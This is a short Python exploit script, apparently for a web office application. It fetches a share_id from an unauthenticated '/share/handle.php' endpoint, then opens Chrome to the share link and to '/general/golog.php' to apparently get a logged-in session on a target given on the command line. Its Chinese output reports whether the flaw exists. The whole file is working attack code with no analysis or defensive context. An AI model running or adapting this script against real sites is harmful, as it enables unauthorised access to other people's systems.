#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re
import time
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait

cdpath = r'bin/chromedriver.exe'

urllib3.disable_warnings()

def start_web_chrome(site, share_id):
    option = webdriver.ChromeOptions()
    #option.add_argument('--start-fullscreen')
    option.add_argument('--log-level=3')
    option.add_argument('--ignore-certificate-errors')
    driver = webdriver.Chrome(executable_path=cdpath, options=option)
    vulnurl1 = site + "/share/index.php?share_id=" + share_id
    driver.get(vulnurl1)
    time.sleep(2)
    vulnurl2 = site + "/general/golog.php?version=ie6"
    driver.get(vulnurl2)
    time.sleep(30)


def get_share_id(site):
    burp0_url = site + "/share/handle.php?module=2&module_id=1"
    burp0_headers = {"User-Agent": "Moziilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) ", "Connection": "close", "Accept-Encoding": "gzip"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    jsondata = r.json()
    if r.status_code == 200 and "short_url" in jsondata:
        return jsondata["short_url"].split("=")[-1]
    return ""

def verify(site):
    share_id = get_share_id(site)
    start_web_chrome(site, share_id)
    return share_id
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取到的 share_id 为：", info)
    else:
        print("[-]漏洞不存在")
